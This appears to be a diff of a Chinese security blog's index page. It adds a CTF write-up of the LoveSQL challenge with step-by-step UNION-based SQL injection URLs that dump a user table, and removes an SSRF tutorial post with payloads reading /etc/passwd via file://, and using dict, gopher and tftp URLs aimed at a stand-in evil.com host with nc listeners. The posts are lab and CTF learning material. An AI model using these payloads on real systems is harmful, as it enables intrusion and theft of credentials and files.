@@ -288,6 +288,163 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/20210124/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/24/20210124/" itemprop="url">（极客大挑战 2019）LoveSQL</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-24T17:17:45+08:00">
+                2021-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/2021020413451645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><a target="_blank" rel="noopener" href="https://www.gaojiufeng.cn/?id=118">万能密码</a><code>1&#39; or 1=1#</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210204200202157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">跳转到check.php，得到用户名和密码</p>
+<p>查询字符段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin<span class="number">&#x27;</span> order by <span class="number">3</span>%<span class="number">23</span>&amp;password=<span class="number">1</span>     /存在</span><br><span class="line">/check.php?username=admin<span class="number">&#x27;</span> order by <span class="number">4</span>%<span class="number">23</span>&amp;password=<span class="number">1</span>     /报错</span><br></pre></td></tr></table></figure>
+<p>注意：此时是在url中输入的，所以不能用#，而用其url编码%23。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210204200610865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">可知共3个字段。用union查询测试注入点（回显点位）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span>&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210204200706939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到回显点位为2和3，查询当前数据库名及版本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="number">1</span>,database(),version()%<span class="number">23</span>&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210204202126304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆表：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="number">23</span>&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021020420222320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">l0ve1ysq1这个表爆字段：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210204202341937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(id,username,password) from l0ve1ysq1%<span class="number">23</span>&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210204202537214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204202438778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到flag</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/23/20210123/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1663,190 +1820,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/07/SSRF(CTFHub)(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/12/07/SSRF(CTFHub)(1)/" itemprop="url">SSRF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-07T08:47:45+08:00">
-                2020-12-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
-<p>SSRF 形成的原因：大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
-<p>也就是说，对于为服务器提供服务的其他应用没有对访问进行限制，如果我构造好我的访问包，那我就有可能利用目标服务对他的其他服务器应用进行调用。</p>
-<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
-<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><img src="https://img-blog.csdnimg.cn/20201129141702905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129141803589.png" alt="在这里插入图片描述"><br>根据题目意思，让我们如访问内网的flag.php<br>输入127.0.0.1/flag.php ，得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129141922387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">也可抓包进行访问，即可得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129142007545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>根据题目的意思我们需要使用URL的伪协议去读取文件，那么我们首先要了解URL的伪协议。</p>
-<p>URL伪协议有如下这些：<br><img src="https://img-blog.csdnimg.cn/20201129142344286.png" alt="在这里插入图片描述"><br><code>file://</code>这种URL Schema可以尝试从文件系统中获取文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</span><br></pre></td></tr></table></figure>
-<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
-<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-<p><code>sftp://</code>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
-<p><code>ldap://</code>或<code>ldaps://</code> 或<code>ldapi://</code>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldaps:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldapi:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquit</span><br></pre></td></tr></table></figure>
-
-<p><code> tftp://</code>  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;evil.com:1337&#x2F;TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
-<p><code>gopher://</code> Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;gopher.php</span><br><span class="line"></span><br><span class="line">&lt;?php  header(&#39;Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest&#39;);?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>
-<p>防御</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.禁止跳转</span><br><span class="line">2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题</span><br><span class="line">4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</span><br><span class="line">5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</span><br><span class="line">6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201130130635337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130130658887.png" alt="在这里插入图片描述">使用file伪协议从文件系统中读取文件，抓包读取:</p>
-<p>**网站的目录一般都在<code>/var/www/html/</code>**，因此我们直接使用file伪协议访问flag.php就可以了。<br><img src="https://img-blog.csdnimg.cn/2020113013101163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/2020113013095957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://img-blog.csdnimg.cn/20201130131217658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131237347.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131309795.png" alt="在这里插入图片描述">题目提示端口在8000-9000，因此直接扫就可以了。这里我们需要使用dict伪协议来扫描，因为dict协议可以用来探测开放的端口。</p>
-<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201130140408511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201130134217486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?url=dict://127.0.0.1:§§</code>开始扫描<br>发现端口是8056.直接进行访问，就可以得到flag了。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201206135512184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p><img src="https://img-blog.csdnimg.cn/20201130135110568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130135125582.png" alt="在这里插入图片描述"><code>?url=127.0.0.1/flag.php</code>尝试直接访问<br><img src="https://img-blog.csdnimg.cn/20201130135330773.png" alt="在这里插入图片描述">出现输入框<br><img src="https://img-blog.csdnimg.cn/20201130135426903.png" alt="在这里插入图片描述"><br>使用Burpsuite抓包，得到<br><img src="https://img-blog.csdnimg.cn/20201130135734268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug: key&#x3D;6b82739ec82821b2d6bbc34b0af30d76--&gt;</span><br></pre></td></tr></table></figure>
-<p>且flag.php存在，将其输入输入框内</p>
-<p><img src="https://img-blog.csdnimg.cn/20201130135651735.png" alt="在这里插入图片描述"><br>得到提示从127.0.0.1查看，且题目提示POST方式</p>
-<p>使用POST方式通过127.0.0.1:80访问flag.php，且在底部输入所得到的<code>key=6b82739ec82821b2d6bbc34b0af30d76</code>即得到flag<br><img src="https://img-blog.csdnimg.cn/20201130140909273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20201206135056426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容。</p>
-<p>即构造<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201206135317719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1897,7 +1870,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
